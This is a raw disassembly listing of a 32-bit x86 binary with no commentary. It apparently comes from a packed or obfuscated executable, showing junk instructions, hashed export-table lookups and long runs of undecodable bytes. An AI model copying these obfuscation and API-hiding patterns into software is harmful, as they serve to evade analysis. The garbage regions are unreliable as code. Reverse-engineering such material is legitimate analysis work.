  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    eax,edx
  40d123:	js     0x40d0b2
  40d125:	dec    esi
  40d126:	stc    
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	inc    eax
  40d12f:	sub    BYTE PTR [esp+eiz*2+0x41],cl
  40d133:	jl     0x40d13b
  40d135:	dec    eax
  40d136:	xchg   ebx,eax
  40d137:	mov    BYTE PTR [eax+0x20],bl
  40d13a:	jl     0x40d114
  40d13c:	cld    
  40d13d:	(bad)  
  40d13e:	addr16 mov ds:0x14cd,eax
  40d142:	sub    bh,BYTE PTR [ecx]
  40d144:	or     DWORD PTR [ebx-0x2f2bdbfd],ebp
  40d14a:	shr    dl,0x2
  40d14d:	adc    eax,0xe757416a
  40d152:	retf   
  40d153:	cmp    esi,edx
  40d155:	adc    cl,ah
  40d157:	mov    bl,0xe6
  40d159:	data16 cli 
  40d15b:	push   0xb4748e6d
  40d160:	sub    eax,0x385094ff
  40d165:	call   0x532c:0xac5a9a2
  40d16c:	outs   dx,DWORD PTR ds:[esi]
  40d16d:	in     eax,0x20
  40d16f:	out    dx,eax
  40d170:	adc    BYTE PTR [esi+0x34],0x84
  40d174:	into   
  40d175:	jne    0x40d18d
  40d177:	std    
  40d178:	mov    cl,0xb4
  40d17a:	pop    ebx
  40d17b:	ss mov esi,0xb21f5f3f
  40d181:	fwait
  40d182:	dec    al
  40d184:	adc    edi,DWORD PTR [ecx-0x25]
  40d187:	jno    0x40d1be
  40d189:	jge    0x40d16f
  40d18b:	lods   eax,DWORD PTR ds:[esi]
  40d18c:	xchg   ebx,eax
  40d18d:	pop    esi
  40d18e:	test   al,0x52
  40d190:	ror    ch,0xb1
  40d193:	bound  ebx,QWORD PTR [esi-0x3659bddc]
  40d199:	xchg   esi,eax
  40d19a:	mov    al,ds:0x128e393d
  40d19f:	imul   esi,DWORD PTR [eax-0xb],0xffffffe4
  40d1a3:	add    edi,DWORD PTR [edx-0x125f750]
  40d1a9:	mov    bh,BYTE PTR [ecx+0x207af55f]
  40d1af:	dec    edi
  40d1b0:	adc    bh,BYTE PTR [ebx+0x1ef1b9e1]
  40d1b6:	or     DWORD PTR [edi+0x5c64c684],ebp
  40d1bc:	je     0x40d14b
  40d1be:	repz popa 
  40d1c0:	add    al,0x19
  40d1c2:	mov    ch,0xbc
  40d1c4:	dec    eax
  40d1c5:	xor    eax,0x76e6f5fd
  40d1ca:	ret    
  40d1cb:	mov    ds:0x555d069b,al
  40d1d0:	jl     0x40d1bb
  40d1d2:	mov    eax,0x17ae0e6d
  40d1d7:	inc    ebx
  40d1d8:	dec    ebp
  40d1d9:	cs je  0x40d24c
  40d1dc:	daa    
  40d1dd:	mov    esi,0xf9934206
  40d1e2:	(bad)  
  40d1e4:	(bad)  
  40d1e5:	jne    0x40d22a
  40d1e7:	outs   dx,DWORD PTR ds:[esi]
  40d1e8:	sbb    eax,0x9f0ca5fd
  40d1ed:	adc    ecx,eax
  40d1ef:	push   esp
  40d1f0:	push   cs
  40d1f1:	add    eax,0xcde3b2fa
  40d1f6:	sub    al,0x0
  40d1f8:	loopne 0x40d1ed
  40d1fa:	jecxz  0x40d216
  40d1fc:	sub    eax,0xddf61445
  40d201:	mov    bh,0xa8
  40d203:	int    0x9a
  40d205:	inc    ebx
  40d206:	(bad)  
  40d207:	xor    BYTE PTR [ecx-0x3fbbb52b],dl
  40d20d:	stos   DWORD PTR es:[edi],eax
  40d20e:	sbb    al,0x18
  40d210:	fcmovne st,st(5)
  40d212:	mov    ebp,0x96381235
  40d217:	ins    DWORD PTR es:[edi],dx
  40d218:	mov    DWORD PTR [edi+0x755ddd31],ebx
  40d21e:	fcmovbe st,st(7)
  40d220:	imul   eax,DWORD PTR [edi],0x15
  40d223:	and    ch,BYTE PTR [esi-0x9f09d49]
  40d229:	xor    al,0xc9
  40d22b:	xchg   edi,eax
  40d22c:	or     ebp,DWORD PTR [edi+0x5d]
  40d22f:	jge    0x40d25a
  40d231:	cwde   
  40d232:	inc    esp
  40d233:	inc    edx
  40d234:	cs mov ebp,0x5e830f7d
  40d23a:	popa   
  40d23b:	enter  0x72b4,0x4a
  40d23f:	in     eax,0xbb
  40d241:	xchg   ebx,eax
  40d242:	mov    ebp,0x6b68a818
  40d247:	pop    es
  40d248:	fwait
  40d249:	xor    al,dl
  40d24b:	fwait
  40d24c:	adc    ah,BYTE PTR [edi-0x50]
  40d24f:	pop    DWORD PTR [edx+ebx*8]
  40d252:	jnp    0x40d26b
  40d254:	xor    bl,BYTE PTR [edx-0x5d5c6195]
  40d25a:	add    ecx,ebx
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x136a8e30
  40d410:	(bad)  
  40d411:	std    
  40d412:	std    
  40d413:	lods   eax,DWORD PTR ds:[esi]
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d3fd
  40d41c:	ficom  WORD PTR [edx+0x68]
  40d41f:	sahf   
  40d420:	mov    al,ds:0xffc84422
  40d425:	or     ah,BYTE PTR [esi+0xe]
  40d428:	into   
  40d429:	call   0x48b0:0x7256b5ee
  40d430:	xchg   edx,eax
  40d431:	test   eax,0x12f78f73
  40d436:	inc    edx
  40d437:	pop    ebp
  40d438:	mov    DWORD PTR [eax+0x26],ecx
  40d43b:	test   eax,0xecc2f605
  40d440:	cmp    edi,DWORD PTR [eax+0x18e70e02]
  40d446:	lea    ebp,[eax]
  40d448:	cmp    eax,0x94d1032c
  40d44d:	sti    
  40d44e:	sub    eax,0x7ad31a9a
  40d453:	cmp    al,cl
  40d455:	pop    edi
  40d456:	push   eax
  40d457:	and    al,0x71
  40d459:	or     ch,cl
  40d45b:	cmp    bl,BYTE PTR [eax]
  40d45d:	ss test dl,dl
  40d460:	cmp    DWORD PTR [ebx+edi*1-0x3b],0x79d1628a
  40d468:	push   0xffffffa2
  40d46a:	lods   al,BYTE PTR ds:[esi]
  40d46b:	pop    ebp
  40d46c:	test   al,0x99
  40d46e:	mov    eax,0x245af120
  40d473:	sub    edi,DWORD PTR [edx]
  40d475:	(bad)  
  40d476:	jns    0x40d48c
  40d478:	ja     0x40d4c2
  40d47a:	dec    eax
  40d47b:	(bad)  
  40d47c:	or     BYTE PTR ds:0xd4d6b5a3,dh
  40d482:	xor    DWORD PTR [ecx+edi*2],ebp
  40d485:	add    ah,0x4f
  40d488:	repz inc esi
  40d48a:	mov    al,0x35
  40d48c:	adc    bl,BYTE PTR [ebp+eax*8+0x6e3be885]
  40d493:	or     ah,BYTE PTR [edi+0x3647447c]
  40d499:	fxch   st(5)
  40d49b:	loop   0x40d4db
  40d49d:	sar    DWORD PTR [esi-0x1f],0x68
  40d4a1:	jmp    0x40d4c9
  40d4a3:	hlt    
  40d4a4:	mov    eax,ds:0x90b1b116
  40d4a9:	fs (bad) 
  40d4ab:	push   ds
  40d4ac:	add    ch,BYTE PTR [esi+0x3b]
  40d4af:	cli    
  40d4b0:	in     al,0xb7
  40d4b2:	(bad)  
  40d4b3:	rcl    DWORD PTR [edi],1
  40d4b5:	and    eax,0x463a9e99
  40d4ba:	jno    0x40d48c
  40d4bc:	outs   dx,BYTE PTR ds:[esi]
  40d4bd:	gs sahf 
  40d4bf:	cmc    
  40d4c0:	and    dh,BYTE PTR [eax+0x4f1da34b]
  40d4c6:	mov    ebx,0x9703338d
  40d4cb:	xor    DWORD PTR [edi-0x7e4dfd73],eax
  40d4d1:	or     esp,DWORD PTR [ebx]
  40d4d3:	inc    edx
  40d4d4:	jne    0x40d4cb
  40d4d6:	and    ecx,DWORD PTR [ecx-0x78]
  40d4d9:	dec    ecx
  40d4da:	inc    esi
  40d4db:	pop    es
  40d4dc:	and    al,0x81
  40d4de:	inc    ebp
  40d4df:	aad    0x1e
  40d4e1:	retf   0xa4d6
  40d4e4:	lds    esi,FWORD PTR ds:0xa77d85bc
  40d4ea:	xchg   edi,eax
  40d4eb:	sub    DWORD PTR [ecx+0x4f],edx
  40d4ee:	cmp    edx,DWORD PTR [esi+0x7c09fa9c]
  40d4f4:	mov    WORD PTR [edi],?
  40d4f6:	mov    cs,WORD PTR [ebp-0x2666c425]
  40d4fc:	mov    eax,ds:0x4ba7d6c6
  40d501:	or     BYTE PTR [ebx+0x455d0965],al
  40d507:	xchg   DWORD PTR [eax+0x25ee521],esi
  40d50d:	pop    ecx
  40d50e:	xor    ch,ah
  40d510:	fst    DWORD PTR [esi-0xd]
  40d513:	mov    ebp,gs
  40d515:	adc    esi,DWORD PTR es:[esp+eax*2]
  40d519:	dec    edx
  40d51a:	or     BYTE PTR [ebx-0x12],0xfa
  40d51e:	call   0x343bb042
  40d523:	cdq    
  40d524:	stos   DWORD PTR es:[edi],eax
  40d525:	or     ebx,edi
  40d527:	add    ch,dl
  40d529:	sbb    BYTE PTR [eax],ah
  40d52b:	repz shl edi,1
  40d52e:	call   0x3753db30
  40d533:	out    dx,al
  40d534:	xor    BYTE PTR [edi],ah
  40d536:	mov    esp,gs
  40d538:	and    edi,DWORD PTR [ecx+eax*4]
  40d53b:	xor    bh,BYTE PTR [edx-0x211a5548]
  40d541:	mov    al,0x1f
  40d543:	rcl    ah,cl
  40d545:	fistp  QWORD PTR [edx-0x1]
  40d548:	jne    0x40d556
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	cmp    ebx,esp
  40d5b9:	pop    ss
  40d5ba:	stos   BYTE PTR es:[edi],al
  40d5bb:	push   ecx
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d5d5
  40d5c4:	or     edi,eax
  40d5c6:	xchg   edi,eax
  40d5c7:	mov    edx,DWORD PTR [ebx]
  40d5c9:	mov    al,ds:0xa04acddd
  40d5ce:	jecxz  0x40d577
  40d5d0:	and    al,0xd2
  40d5d2:	xchg   esp,eax
  40d5d3:	lods   al,BYTE PTR ds:[esi]
  40d5d4:	rcl    BYTE PTR [ebx],0x7b
  40d5d7:	dec    edi
  40d5d8:	sbb    eax,esi
  40d5da:	into   
  40d5db:	add    edi,0x23b07a78
  40d5e1:	and    edx,DWORD PTR [edi+0x1642fa4b]
  40d5e7:	adc    edx,DWORD PTR [eax-0x1b488bf1]
  40d5ed:	aad    0xcc
  40d5ef:	sub    eax,0x31934c9
  40d5f4:	pusha  
  40d5f5:	and    ah,BYTE PTR [edi-0x1f]
  40d5f8:	push   cs
  40d5f9:	retf   
  40d5fa:	in     al,dx
  40d5fb:	add    esi,ecx
  40d5fd:	inc    ebx
  40d5fe:	pop    es
  40d5ff:	call   FWORD PTR [eax+0x45]
  40d602:	div    DWORD PTR [ecx+0x7e46950c]
  40d608:	in     eax,dx
  40d609:	jmp    0x91d9f159
  40d60e:	pop    esp
  40d60f:	ficom  WORD PTR [edx-0x1]
  40d612:	repz cmp al,0x77
  40d615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d616:	das    
  40d617:	adc    ah,BYTE PTR fs:[esi+0x474e5d2d]
  40d61e:	sub    dh,BYTE PTR [ebp+0x4164ccd5]
  40d624:	lds    edx,FWORD PTR [ecx+0x15]
  40d627:	dec    edx
  40d628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d629:	push   eax
  40d62a:	dec    esi
  40d62b:	adc    bh,al
  40d62d:	pop    esp
  40d62e:	cmp    eax,0x318eb860
  40d633:	scas   eax,DWORD PTR es:[edi]
  40d634:	mov    cs,WORD PTR [edi-0x21]
  40d637:	(bad)  
  40d639:	sbb    ebp,DWORD PTR [eax-0x38]
  40d63c:	iret   
  40d63d:	jge    0x40d641
  40d63f:	xor    ecx,DWORD PTR [esi-0x18f68ae0]
  40d645:	mov    BYTE PTR [eax],dl
  40d647:	and    eax,0xfa90731c
  40d64c:	xchg   DWORD PTR [edi],ebp
  40d64e:	pushf  
  40d64f:	add    al,0xcc
  40d651:	and    eax,0x63db252b
  40d656:	xor    esp,DWORD PTR [edi-0x25]
  40d659:	pusha  
  40d65a:	jno    0x40d65e
  40d65c:	ds jp  0x40d6bc
  40d65f:	fsub   QWORD PTR [edx]
  40d661:	repnz sbb edx,eax
  40d664:	dec    ecx
  40d665:	pop    DWORD PTR [edx]
  40d667:	arpl   WORD PTR [eax+ecx*2+0x74f7f285],sp
  40d66e:	aad    0xcd
  40d670:	push   esi
  40d671:	ret    0x8d6d
  40d674:	mov    edi,0x9eb04ab
  40d679:	inc    ebx
  40d67a:	or     BYTE PTR [ecx],dl
  40d67c:	mov    edi,0x477b3fda
  40d682:	mov    edx,0x6828a105
  40d687:	mov    dl,0x89
  40d689:	rcr    BYTE PTR [eax],cl
  40d68b:	clc    
  40d68c:	clc    
  40d68d:	hlt    
  40d68e:	xor    edx,DWORD PTR [edx-0x45697049]
  40d694:	jne    0x40d6b2
  40d696:	fistp  QWORD PTR [edi+0x50e91b7]
  40d69c:	jno    0x40d6ad
  40d69e:	imul   ebp,DWORD PTR [edi],0x3ec48baf
  40d6a4:	test   BYTE PTR [esi+0x1c],dl
  40d6a7:	mov    eax,0x34e373a0
  40d6ac:	in     al,0x22
  40d6ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6af:	jae    0x40d70a
  40d6b1:	(bad)  
  40d6b3:	stos   BYTE PTR es:[edi],al
  40d6b4:	pop    esp
  40d6b5:	imul   edx,DWORD PTR [ebx+0x50],0xffffffc2
  40d6b9:	jmp    0xb586811
